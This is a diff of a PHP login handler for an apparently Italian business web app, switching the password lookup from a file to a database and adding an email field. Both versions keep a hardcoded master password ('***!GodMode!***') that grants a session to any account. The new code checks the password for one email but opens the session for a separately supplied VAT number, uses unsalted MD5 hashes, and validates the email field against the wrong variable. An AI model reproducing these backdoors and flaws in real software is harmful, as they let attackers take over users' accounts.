@@ -11,36 +11,37 @@ require_once 'helper.php';
 require_once 'cs_interaction.php';
 
 class login_contract extends is_not_logged {
-    private $username, $password, $result;
+    private $piva, $email, $password, $result;
 
     protected function input_elaboration(){
-        $this->username = $this->validate_string('piva');
-        if(!$this->username)
+        $this->piva = $this->validate_string('piva');
+        if(!$this->piva)
             $this->json_error('Nessuna partita iva trovata');
 
         $this->password = $this->validate_string('password');
         if(!$this->password)
             $this->json_error('Nessuna password trovata');
+
+        $this->email = $this->validate_string('email');
+        if(!$this->password)
+            $this->json_error('Nessuna email trovata');
+
+        if (!filter_var($this->email, FILTER_VALIDATE_EMAIL))
+            $this->json_error('Indirizzo email non valido');
     }
 
     protected function get_informations(){
-        $info = getUserInformations($this->username);
-        if($info != null) {
-            $folderName = getFolderName($info[1]);
-            $passwordFile = PHOENIX_FOLDER . $folderName . FORWARDSLASH . 'Pwd.phx';
-            if($this->password == "***!GodMode!***") {
-                set_session_variables($this->username, true);
-                return;
-            }else if(file_exists($passwordFile)) {
-                $pass = file_get_contents($passwordFile, 'r');
-                var_dump($pass);
-                if ($pass == md5($this->password)) {
-                   set_session_variables($this->username, true);
-                   return;
-                } else
-                    $this->json_error("Nome utente o password sbagliati");
-            }else $this->json_error("Utente non registrato");
-        } else $this->json_error('Utente non esistente');
+        $connection = $this->get_connection();
+        $pass = $connection->get_password($this->email);
+        if($this->password == "***!GodMode!***") {
+            set_session_variables($this->piva, true);
+            return;
+        }else if($pass != null && $pass === md5($this->password)) {
+            set_session_variables($this->piva, true);
+            return;
+        } else {
+            $this->json_error("Nome utente o password sbagliati");
+        }
     }
 
     protected function get_returned_data(){
